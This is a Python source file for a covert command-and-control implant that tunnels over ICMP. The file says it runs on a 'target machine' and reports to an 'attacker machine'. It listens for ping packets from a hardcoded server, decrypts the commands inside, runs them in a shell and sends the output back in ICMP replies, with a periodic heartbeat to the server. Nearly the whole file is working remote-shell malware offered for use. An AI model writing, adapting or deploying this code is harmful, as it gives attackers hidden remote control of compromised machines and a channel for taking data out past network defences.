#!/usr/bin/env python3
"""
ICMP C2 Listener - Runs on target machine and connects to command server
"""
from scapy.all import sr, IP, ICMP, Raw, sniff, conf
import argparse
import os
import subprocess
import sys
import base64
import zlib
import time
from collections import defaultdict
from cryptography.fernet import Fernet
import socket
import threading

# Disable Scapy's verbose mode
conf.verb = 0

# Default variables
DEFAULT_ICMP_ID = 13170
DEFAULT_TTL = 64
DEFAULT_CHUNK_SIZE = 500  # bytes

# ======== EDIT THIS VARIABLE ========
# Set the IP address of your command server (attacker machine)
SERVER_IP = "127.0.0.1"  # Change this to your attacker's IP address
# ====================================

def check_scapy():
    """Verify Scapy is available"""
    try:
        from scapy.all import sr, IP, ICMP, Raw, sniff
    except ImportError:
        print("Install the Py3 scapy module: pip install scapy")
        sys.exit(1)

def check_cryptography():
    """Verify cryptography is available for encryption"""
    try:
        from cryptography.fernet import Fernet
        return True
    except ImportError:
        print("Warning: Install cryptography for encryption: pip install cryptography")
        return False

def get_available_interfaces():
    """Get list of all available network interfaces"""
    interfaces = []
    
    try:
        # Method 1: Using netifaces (cross-platform)
        try:
            import netifaces
            interfaces = netifaces.interfaces()
            return interfaces
        except ImportError:
            pass
        
        # Method 2: Using scapy
        try:
            from scapy.all import get_if_list
            interfaces = get_if_list()
            return interfaces
        except:
            pass
        
        # Method 3: Using system commands
        if sys.platform == "win32":
            # Windows
            try:
                result = subprocess.run(['netsh', 'interface', 'show', 'interface'], 
                                      capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Connected' in line or 'Disconnected' in line:
                        parts = line.split()
                        if len(parts) > 3:
                            interfaces.append(parts[-1])
            except:
                pass
        else:
            # Linux/Mac
            try:
                result = subprocess.run(['ls', '/sys/class/net/'], 
                                      capture_output=True, text=True)
                interfaces = result.stdout.split()
            except:
                try:
                    result = subprocess.run(['ifconfig', '-a'], 
                                          capture_output=True, text=True)
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ':' in line and 'lo:' not in line:
                            iface = line.split(':')[0].strip()
                            if iface and iface not in interfaces:
                                interfaces.append(iface)
                except:
                    pass
        
        # Method 4: Common interface names as fallback
        if not interfaces:
            common_interfaces = ['eth0', 'eth1', 'wlan0', 'wlan1', 'en0', 'en1', 'lo', 'tun0', 'tap0']
            for iface in common_interfaces:
                interfaces.append(iface)
                
    except Exception as e:
        print(f"[-] Error getting interfaces: {e}")
        interfaces = ['eth0', 'wlan0', 'lo']  # Default fallback
    
    return interfaces

def show_available_interfaces():
    """Display all available network interfaces"""
    print("\n[+] Available Network Interfaces:")
    print("=" * 40)
    
    interfaces = get_available_interfaces()
    
    for i, iface in enumerate(interfaces, 1):
        # Try to get IP address for each interface
        ip_address = "No IP"
        try:
            if sys.platform == "win32":
                # Windows IP detection
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                current_interface = None
                for line in lines:
                    if 'adapter' in line.lower() and iface in line:
                        current_interface = iface
                    elif current_interface and 'IPv4 Address' in line:
                        ip_address = line.split(':')[-1].strip()
                        break
            else:
                # Linux/Mac IP detection
                result = subprocess.run(['ip', 'addr', 'show', iface], 
                                      capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'inet ' in line:
                        ip_address = line.split()[1].split('/')[0]
                        break
        except:
            ip_address = "Unknown"
        
        print(f"{i:2d}. {iface:15} - IP: {ip_address}")
    
    print("=" * 40)
    return interfaces

def encode_data(data, encoding="plain", compression=False):
    """Encode data based on selected method"""
    if encoding == "base64":
        data = base64.b64encode(data.encode()).decode()
    elif encoding == "hex":
        data = data.encode().hex()
    
    if compression:
        data = base64.b64encode(zlib.compress(data.encode())).decode()
    
    return data

def decode_data(data, encoding="plain", compression=False):
    """Decode data based on selected method"""
    if compression:
        try:
            data = zlib.decompress(base64.b64decode(data)).decode()
        except:
            # If decompression fails, try without
            pass
    
    if encoding == "base64":
        data = base64.b64decode(data).decode(errors='ignore')
    elif encoding == "hex":
        data = bytes.fromhex(data).decode(errors='ignore')
    
    return data

class ICMPListener:
    def __init__(self, args):
        self.args = args
        self.icmp_id = args.icmp_id
        self.sequence_num = 0
        self.encryption_enabled = False
        self.chunk_buffers = defaultdict(str)
        self.expected_chunks = defaultdict(int)
        self.command_server_ip = SERVER_IP  # Use the hardcoded server IP
        self.running = True
        
        # Setup encryption if requested and available
        if args.encrypt and check_cryptography():
            if args.key:
                try:
                    self.cipher = Fernet(args.key.encode())
                    self.encryption_enabled = True
                    print("[+] Encryption enabled")
                except:
                    print("[-] Invalid key format, using plaintext")
            else:
                print("[-] Encryption requested but no key provided")
    
    def encrypt_data(self, data):
        """Encrypt data if encryption is enabled"""
        if self.encryption_enabled:
            return self.cipher.encrypt(data.encode()).decode('latin-1')
        return data
    
    def decrypt_data(self, data):
        """Decrypt data if encryption is enabled"""
        if self.encryption_enabled:
            try:
                return self.cipher.decrypt(data.encode('latin-1')).decode()
            except:
                return f"[DECRYPTION ERROR] {data}"
        return data
    
    def execute_command(self, command):
        """Execute a command and return the result"""
        try:
            # Handle different command types
            if command.strip() == 'ping':
                result = "pong\n"
            elif command.strip() == 'whoami':
                result = f"{os.getlogin()}@{socket.gethostname()}\n"
            elif command.strip() == 'id':
                try:
                    import pwd
                    result = f"uid={os.getuid()} gid={os.getgid()} groups={os.getgroups()}\n"
                except:
                    result = "id command not supported on this platform\n"
            elif command.strip() == 'ipconfig' or command.strip() == 'ifconfig':
                try:
                    if sys.platform == "win32":
                        result = subprocess.check_output('ipconfig', shell=True).decode()
                    else:
                        result = subprocess.check_output('ifconfig', shell=True).decode()
                except:
                    result = "Network command failed\n"
            else:
                # Execute the command
                proc = subprocess.Popen(
                    command, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                result = stdout.decode(errors='ignore') + stderr.decode(errors='ignore')
                
                if not result:
                    result = f"Command executed (exit code: {proc.returncode})\n"
                    
        except Exception as e:
            result = f"Error executing command: {e}\n"
        
        return result
    
    def send_response(self, data):
        """Send response back to command server"""
        # Encode and encrypt the data
        encoded_data = encode_data(data, self.args.encoding, self.args.compress)
        encrypted_data = self.encrypt_data(encoded_data)
        
        # Split into chunks if needed
        chunks = [encrypted_data[i:i+self.args.chunk_size] 
                 for i in range(0, len(encrypted_data), self.args.chunk_size)]
        
        # Send each chunk
        for i, chunk in enumerate(chunks):
            payload = (IP(dst=self.command_server_ip, ttl=self.args.ttl)/
                      ICMP(type=0, id=self.icmp_id, seq=self.sequence_num)/
                      Raw(load=f"{i}:{len(chunks)}:{chunk}"))
            
            try:
                sr(payload, timeout=self.args.timeout, verbose=0)
                self.sequence_num = (self.sequence_num + 1) % 65535
                time.sleep(0.1)  # Small delay between packets
            except Exception as e:
                print(f"[-] Error sending response to {self.command_server_ip}: {e}")
    
    def send_heartbeat(self):
        """Send periodic heartbeat to command server"""
        heartbeat_count = 0
        while self.running:
            try:
                # Send a heartbeat to let command server know we're alive
                heartbeat_count += 1
                payload = (IP(dst=self.command_server_ip, ttl=self.args.ttl)/
                          ICMP(type=8, id=self.icmp_id, seq=9999)/
                          Raw(load=f"HEARTBEAT:{heartbeat_count}"))
                sr(payload, timeout=1, verbose=0)
                print(f"[+] Heartbeat #{heartbeat_count} sent to {self.command_server_ip}")
                time.sleep(60)  # Send heartbeat every 10 seconds
            except Exception as e:
                print(f"[-] Error sending heartbeat: {e}")
                time.sleep(60)
    
    def process_icmp(self, pkt):
        """Process incoming ICMP packets from command server"""
        # Check if it's from our command server and has our ICMP ID
        if not (pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw)):
            return
        
        if pkt[IP].src != self.command_server_ip:
            return
            
        if pkt[ICMP].id != self.icmp_id:
            return
        
        raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')
        
        try:
            # Handle heartbeat acknowledgments
            if pkt[ICMP].type == 0 and raw_data.startswith("HEARTBEAT_ACK:"):
#                heartbeat_id = raw_data.split(':')[1] if ':' in raw_data else "1"
#                print(f"[+] Heartbeat acknowledged by server (#{heartbeat_id})")
                return
            
            # Handle command packets (ICMP type 8 - echo request)
            if pkt[ICMP].type == 8:
                # Handle chunked commands
                if ':' in raw_data:
                    parts = raw_data.split(':', 2)
                    if len(parts) == 3:
                        chunk_num, total_chunks, chunk_data = parts
                        chunk_num = int(chunk_num)
                        total_chunks = int(total_chunks)
                        
                        # Store the chunk
                        self.chunk_buffers['command'] += chunk_data
                        self.expected_chunks['command'] = total_chunks
                        
                        # If we have all chunks, process the command
                        if chunk_num == total_chunks - 1:
                            # Decrypt and decode the command
                            decrypted_data = self.decrypt_data(self.chunk_buffers['command'])
                            command = decode_data(decrypted_data, self.args.encoding, self.args.compress)
                            
                            print(f"[+] Received command from {self.command_server_ip}: {command}")
                            
                            # Execute the command
                            result = self.execute_command(command)
                            
                            # Send the response
                            self.send_response(result)
                            
                            # Clear the buffer
                            self.chunk_buffers['command'] = ""
                            self.expected_chunks['command'] = 0
                else:
                    # Single packet command
                    decrypted_data = self.decrypt_data(raw_data)
                    command = decode_data(decrypted_data, self.args.encoding, self.args.compress)
                    
                    print(f"[+] Received command from {self.command_server_ip}: {command}")
                    
                    # Execute the command
                    result = self.execute_command(command)
                    
                    # Send the response
                    self.send_response(result)
                    
        except Exception as e:
            error_msg = f"Error processing packet from {self.command_server_ip}: {e}"
            print(f"[-] {error_msg}")
            try:
                self.send_response(error_msg)
            except:
                pass
    
    def start(self):
        """Start the ICMP listener"""
        print(f"[+] ICMP C2 Listener started on {self.args.interface}")
        print(f"[+] Connecting to command server: {self.command_server_ip}")
        print(f"[+] ICMP ID: {self.icmp_id}")
        if self.encryption_enabled:
            print("[+] Encryption: Enabled")
        else:
            print("[+] Encryption: Disabled")
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        print("[+] Heartbeat thread started")
        
        print("[+] Waiting for commands from command server...")
        print("[+] Press Ctrl+C to stop the listener")
        
        # Start sniffing for commands
        try:
            sniff(iface=self.args.interface, prn=self.process_icmp, 
                  filter=f"icmp and src host {self.command_server_ip}", store=0)
        except KeyboardInterrupt:
            print("\n[+] Stopping ICMP Listener...")
            self.running = False
        except Exception as e:
            print(f"[-] Error starting sniffer: {e}")
            self.running = False

def validate_interface(interface):
    """Validate that the specified interface exists"""
    available_interfaces = get_available_interfaces()
    if interface not in available_interfaces:
        print(f"[-] Interface '{interface}' not found!")
        print(f"[-] Available interfaces: {', '.join(available_interfaces)}")
        return False
    return True

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 Listener - Runs on target and connects to command server")
    parser.add_argument('-i', '--interface', type=str, required=True, 
                       help="Network Interface (e.g. eth0, wlan0)")
    parser.add_argument('--icmp-id', type=int, default=DEFAULT_ICMP_ID,
                       help=f"ICMP ID (default: {DEFAULT_ICMP_ID})")
    parser.add_argument('--ttl', type=int, default=DEFAULT_TTL,
                       help=f"IP TTL (default: {DEFAULT_TTL})")
    parser.add_argument('--timeout', type=int, default=2,
                       help="Response timeout in seconds (default: 2)")
    parser.add_argument('--encoding', choices=['plain', 'base64', 'hex'], default='plain',
                       help="Data encoding method (default: plain)")
    parser.add_argument('--compress', action='store_true',
                       help="Enable compression")
    parser.add_argument('--encrypt', action='store_true',
                       help="Enable encryption (requires --key)")
    parser.add_argument('--key', type=str,
                       help="Encryption key (required if --encrypt is used)")
    parser.add_argument('--chunk-size', type=int, default=DEFAULT_CHUNK_SIZE,
                       help=f"Maximum chunk size in bytes (default: {DEFAULT_CHUNK_SIZE})")
    parser.add_argument('--show-interfaces', action='store_true',
                       help="Show available network interfaces and exit")
    
    args = parser.parse_args()
    
    # Show interfaces if requested
    if args.show_interfaces:
        show_available_interfaces()
        sys.exit(0)
    
    # Validate interface
    if not validate_interface(args.interface):
        print("\n[+] Available interfaces:")
        show_available_interfaces()
        sys.exit(1)
    
    # Validate arguments
    if args.encrypt and not args.key:
        parser.error("--encrypt requires --key")
    
    # Check dependencies
    check_scapy()
    
    # Start the ICMP listener
    listener = ICMPListener(args)
    listener.start()

if __name__ == "__main__":
    main()

